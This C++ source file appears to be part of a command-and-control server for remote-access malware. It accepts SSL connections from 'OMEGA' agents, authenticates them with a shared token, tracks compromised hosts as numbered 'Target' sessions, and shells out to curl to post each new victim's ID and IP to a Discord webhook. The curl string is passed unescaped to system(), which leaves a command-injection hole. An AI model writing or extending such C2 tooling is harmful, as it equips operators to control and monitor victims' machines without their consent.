#include "../include/session_manager.h"
#include "../include/common_state.h"
#include "../include/ui_manager.h"
#include "../include/ipc_manager.h"
#include "../ssl_server.h"
#include "../../common/protocol.h"
#include "../../common/config.h"
#include <iostream>
#include <thread>
#include <mutex>
#include <ctime>
#include <sstream>

void SendDiscordNotification(int session_id, std::string ip) {
    if (DISCORD_WEBHOOK_URL.empty()) return;
    // Simple JSON payload
    std::string payload = "{\\\"content\\\": \\\":rocket: **New OMEGA Agent Online**\\\\n**ID**: " + std::to_string(session_id) + "\\\\n**IP**: " + ip + "\\\"}";
    std::string cmd = "curl -H \"Content-Type: application/json\" -X POST -d \"" + payload + "\" " + DISCORD_WEBHOOK_URL + " -s -o NUL";
    system(cmd.c_str());
}

void HandleAgentConnection(SSL* client_ssl, int session_id, std::string peer_ip) {
    AsyncLog(std::string(INFO_TAG) + "Menjalankan SSL Handshake untuk: " + std::string(CYAN) + peer_ip + RESET);
    std::string token;
    if (!ReceiveSecureMessage(client_ssl, token) || token != AUTH_TOKEN) {
        AsyncLog(std::string(ERROR_TAG) + "Otentikasi GAGAL (Token Salah) dari: " + std::string(RED) + peer_ip + RESET);
        SSL_free(client_ssl);
        return;
    }
    
    AsyncLog(std::string(SUCCESS_TAG) + "Agen Terotentikasi: " + std::string(GREEN) + peer_ip + RESET + " (Session ID: " + std::to_string(session_id) + ")");
    {
        std::lock_guard<std::mutex> lock(session_mutex);
        active_sessions[session_id] = { session_id, client_ssl, peer_ip, "Unknown", "Active", time(NULL), true };
    }
    
    // Notify Discord
    SendDiscordNotification(session_id, peer_ip);
}

void AcceptorThread(void* server_ptr) {
    SSLServer* server = (SSLServer*)server_ptr;
    while (c2_running) {
        SSL* client_ssl = server->AcceptClient(); 
        if (!client_ssl) continue;
        
        // Log simple connection
        AsyncLog(std::string(INFO_TAG) + "Koneksi baru diterima pada port " + std::to_string(SERVER_PORT));
        
        int current_id;
        {
            std::lock_guard<std::mutex> lock(session_mutex);
            current_id = next_session_id++;
        }
        
        std::thread t(HandleAgentConnection, client_ssl, current_id, "Target-" + std::to_string(current_id));
        t.detach();
    }
}

void InteractWithSession(int session_id) {
    std::cout << INFO_TAG << "Menghubungkan ke Sesi " << session_id << RESET << std::endl;
}
